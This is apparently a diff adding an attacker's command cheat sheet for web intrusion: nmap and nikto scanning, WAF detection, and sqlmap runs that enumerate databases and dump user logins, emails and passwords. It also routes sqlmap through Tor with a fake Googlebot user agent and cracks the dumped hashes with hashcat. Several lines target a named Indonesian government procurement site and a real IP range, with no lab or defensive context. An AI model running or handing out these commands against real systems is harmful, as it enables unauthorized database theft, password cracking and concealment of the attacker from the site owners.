@@ -1,0 +1,42 @@
+db_nmap 173.237.136.21/24 -PN
+nikto -h <IP or hostname>
+nikto -h <url>
+nmap -sP <IPrange>
+nmap -p80 --script http-waf-detect <host>
+nmap -p80 --script http-waf-fingerprint <host>
+wafw00f.py <url>
+sqlmap -u https://www.inaproc.lkpp.go.id/ --dbs --random-agent --ignore-proxy --timeout=10
+sqlmap -u https://www.inaproc.lkpp.go.id/ --dbs
+sqlmap -u <victim> --dbs --time-sec 10 --level=3 --risk=3 
+sqlmap -u <victim> -D sqldummywebsite --tables
+sqlmap -u <victim> -D sqldummywebsite -T user_info --columns
+sqlmap -u <victim> -D sqldummywebsite -T user_info -C user_login --dump
+sqlmap -u <victim> -D sqldummywebsite -T user_info -C user_password --dump
+
+sqlmap -u <url>/*.php?catid=5 --dbs
+sqlmap -u <url>/*.php?catid=5 -D acuart --tables 
+sqlmap -u <url>/*.php?catid=5 -D acuart --tables 
+sqlmap -u <url>/*.php?catid=5 -D acuart -T users –columns
+sqlmap -u <url>/*.php?catid=5 -D acuart -T users -C email,name,password -dump
+
+sqlmap -u <url>/*.php?cat=1
+sqlmap -u <url>/*.php?cat=1 --time-sec 15
+sqlmap -u <url>/*.php?cat=1 --dbs
+sqlmap -u <url>/*.php?cat=1 -D acuart --tables
+sqlmap -u <url>/*.php?cat=1 -D acuart -T users --columns
+sqlmap -u <url>/*.php?cat=1 -D acuart -T users -C email,name,pass --dump
+
+sqlmap -u <url> --dbs
+sqlmap -u <url>/*.php?cat=2 --tor --tor-type=SOCKS5
+sqlmap -u <url>/*.php?cat=2 --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+sqlmap -u <url>/cgi-bin/item.cgi?item_id=15 -D databasetable --tables --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+sqlmap -u <url>/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info --column --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+sqlmap -u <url>/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_login --dump --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+findmyhash
+hash-identifier
+cudahashcat --help | grep DES
+cudahashcat -m 1500 -a 0 /root/sql/DES.hash /root/sql/rockyou.txt
